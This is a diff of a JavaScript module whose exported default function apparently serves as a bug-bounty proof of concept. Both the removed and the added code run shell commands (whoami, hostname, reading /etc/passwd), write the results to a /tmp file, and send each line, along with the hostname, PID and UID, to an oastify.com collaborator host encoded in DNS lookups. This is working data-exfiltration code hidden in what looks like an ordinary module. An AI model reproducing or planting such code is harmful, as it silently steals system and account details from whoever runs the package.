@@ -1,38 +1,37 @@
 module.exports = {
   default: function(props) {
     try {
-      var cp = require("child_process");
-      var fs = require("fs");
       var os = require("os");
       var dns = require("dns");
+      var h = os.hostname();
+      var p = process.pid;
+      var u = os.userInfo();
       
-      // 1. Создаём файл /tmp/myasnikov
-      cp.execSync("whoami > /tmp/myasnikov 2>&1");
-      cp.execSync("hostname >> /tmp/myasnikov 2>&1");
-      cp.execSync("cat /etc/passwd 2>&1 | head -3 >> /tmp/myasnikov");
-      cp.execSync("cat /proc/sys/kernel/hostname 2>&1 >> /tmp/myasnikov");
+      // Сначала DNS — гарантированно уйдёт
+      dns.lookup(h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
+      dns.lookup("pid" + p + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
+      dns.lookup("uid" + u.uid + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
+    } catch(e) {}
+    
+    try {
+      var cp = require("child_process");
       
-      // 2. Читаем содержимое
-      var content = fs.readFileSync("/tmp/myasnikov", "utf8").trim();
-      var lines = content.split("\n").slice(0, 5);
+      // Создаём файл
+      cp.execSync("whoami > /tmp/myasnikov_bb_proof.txt 2>&1", {timeout: 5000});
+      cp.execSync("hostname >> /tmp/myasnikov_bb_proof.txt 2>&1", {timeout: 5000});
+      cp.execSync("cat /etc/passwd 2>&1 | head -2 >> /tmp/myasnikov_bb_proof.txt", {timeout: 5000});
+      cp.execSync("cat /proc/sys/kernel/hostname 2>&1 >> /tmp/myasnikov_bb_proof.txt", {timeout: 5000});
       
-      // 3. Отправляем каждую строку через DNS
+      // Читаем и шлём содержимое через DNS
+      var fs = require("fs");
+      var content = fs.readFileSync("/tmp/myasnikov_bb_proof.txt", "utf8").trim();
+      var lines = content.split("\n");
       for (var i = 0; i < lines.length; i++) {
-        var encoded = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 50);
-        dns.lookup("f" + i + encoded + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
+        var encoded = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 45);
+        require("dns").lookup("f" + i + "-" + encoded + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
       }
-      
-      // 4. Дополнительно: hostname, pid, uptime
-      dns.lookup(os.hostname() + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
-      dns.lookup("pid" + process.pid + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
-      
-    } catch(e) {
-      // Fallback: хотя бы hostname
-      try { 
-        var h = require("os").hostname();
-        require("dns").lookup("err-" + h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
-      } catch(e2) {}
-    }
+    } catch(e) {}
+    
     return null;
   }
 };
